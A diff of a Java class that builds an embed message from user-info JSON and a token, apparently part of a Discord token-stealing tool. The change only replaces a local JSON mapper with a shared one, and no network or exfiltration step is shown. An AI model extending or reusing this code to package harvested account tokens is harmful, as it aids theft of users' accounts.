@@ -6,11 +6,9 @@ import java.util.HashMap;
 import java.util.Map;
 
 import com.fasterxml.jackson.databind.JsonNode;
-import com.fasterxml.jackson.databind.ObjectMapper;
 import com.fasterxml.jackson.databind.node.ObjectNode;
 
 public class EmbedGenerator {
-    private static final ObjectMapper objectMapper = new ObjectMapper();
     private static final String TEMPLATE_PATH = "/EmbedTemplate.json";
     private static final Map<String, String> NITRO_TRANSLATION = new HashMap<>();
 
@@ -24,7 +22,7 @@ public class EmbedGenerator {
     public static String generateEmbed(String userInfoJson, String token) {
         try {
             InputStream templateStream = EmbedGenerator.class.getResourceAsStream(TEMPLATE_PATH);
-            JsonNode templateNode = objectMapper.readTree(new InputStreamReader(templateStream));
+            JsonNode templateNode = Json.getObjectMapper().readTree(new InputStreamReader(templateStream));
             Map<String, String> placeholders = createPlaceholders(userInfoJson, token);
             return populateTemplate(templateNode, placeholders).toString();
         } catch (Exception ignored) {}
@@ -35,7 +33,7 @@ public class EmbedGenerator {
     private static Map<String, String> createPlaceholders(String userInfoJson, String token) {
         JsonNode userInfo = null;
         try {
-            userInfo = objectMapper.readTree(userInfoJson);
+            userInfo = Json.getObjectMapper().readTree(userInfoJson);
         } catch (Exception ignored) {}
 
         Map<String, String> placeholders = new HashMap<>();
@@ -65,7 +63,7 @@ public class EmbedGenerator {
         }
 
         try {
-            return objectMapper.readValue(template, ObjectNode.class);
+            return Json.getObjectMapper().readValue(template, ObjectNode.class);
         } catch (Exception ignored) {}
 
         return null;
